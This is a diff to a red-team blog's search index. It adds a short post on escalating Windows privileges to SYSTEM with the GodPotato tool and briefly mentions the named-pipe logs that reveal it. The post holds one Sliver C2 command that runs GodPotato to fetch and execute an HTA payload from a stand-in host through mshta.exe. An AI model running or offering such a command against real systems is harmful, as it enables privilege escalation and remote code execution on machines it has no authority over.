@@ -98,6 +98,43 @@
     
     
     <entry>
+      <title>2.c Privilege Escalation - Potatoes</title>
+      <link href="https://mmnoureldin.github.io/Red-Team/2023/02/25/Privilege-Escalation-Potatoes/"/>
+      <url>https://mmnoureldin.github.io/Red-Team/2023/02/25/Privilege-Escalation-Potatoes/</url>
+      
+        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>There are a lot of different potatoes exploits used to escalate privileges from <code>Windows Service Accounts</code> to <code>NT AUTHORITY/SYSTEM</code>, <a href="https://github.com/BeichenDream/GodPotato" title="" target="">godpotato</a> is a recent tool that combines many of these techniques together, even better, it is also works on windows 11.</p><p>This post is a continuation for an alternate way to escalate our privilege after gaining access as in <a href="https://mmnoureldin.github.io/Red-Team/2023/02/13/Gaining-Initial-Foothold/" title="1. Gaining Initial Foothold">1. Gaining Initial Foothold</a>.</p><img src="https://mmnoureldin.github.io/Red-Team/2023/02/25/Privilege-Escalation-Potatoes/mindmap_godpotato.png" class=""><span id="more"></span><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>The exploitation is very simple, first we need to download the binary from the <a href="https://github.com/BeichenDream/GodPotato" title="" target="">source on github</a>.<br>Then we can use our C2 to execute it.</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sliver (PARALLEL_SEASIDE) &gt; execute-assembly -M -E /opt/godpotato/GodPotato-NET4.exe -cmd \&quot;cmd.exe /C &#x27;mshta.exe https://fake-host.com/shell.hta&#x27;\&quot;</span><br></pre></td></tr></table></figure><h2 id="Observation"><a href="#Observation" class="headerlink" title="Observation"></a>Observation</h2><p>Among other logs the most notable ones are the creation of a named pipe and the access by <code>system</code> user to it.</p><img src="https://mmnoureldin.github.io/Red-Team/2023/02/25/Privilege-Escalation-Potatoes/image-20230430012402870.png" class="">]]></content>
+      
+      
+      <categories>
+          
+          <category> red team </category>
+          
+          <category> privilege escalation </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> T1055 </tag>
+            
+            <tag> Print Spoofer </tag>
+            
+            <tag> Spool sample </tag>
+            
+            <tag> T1134 </tag>
+            
+            <tag> T1003.001 </tag>
+            
+            <tag> named pipe </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>2.a Privilege Escalation - Printspoofer</title>
       <link href="https://mmnoureldin.github.io/Red-Team/2023/02/24/Privilege-Escalation-Printspoofer/"/>
       <url>https://mmnoureldin.github.io/Red-Team/2023/02/24/Privilege-Escalation-Printspoofer/</url>
@@ -214,22 +251,22 @@
     
     
     <entry>
-      <title>Categories</title>
-      <link href="https://mmnoureldin.github.io/Red-Team/categories/index.html"/>
-      <url>https://mmnoureldin.github.io/Red-Team/categories/index.html</url>
+      <title>about</title>
+      <link href="https://mmnoureldin.github.io/Red-Team/about/index.html"/>
+      <url>https://mmnoureldin.github.io/Red-Team/about/index.html</url>
       
-        <content type="html"><![CDATA[]]></content>
+        <content type="html"><![CDATA[<p>Just another hacking blog !</p>]]></content>
       
     </entry>
     
     
     
     <entry>
-      <title>about</title>
-      <link href="https://mmnoureldin.github.io/Red-Team/about/index.html"/>
-      <url>https://mmnoureldin.github.io/Red-Team/about/index.html</url>
+      <title>Categories</title>
+      <link href="https://mmnoureldin.github.io/Red-Team/categories/index.html"/>
+      <url>https://mmnoureldin.github.io/Red-Team/categories/index.html</url>
       
-        <content type="html"><![CDATA[<p>Just another hacking blog !</p>]]></content>
+        <content type="html"><![CDATA[]]></content>
       
     </entry>
     
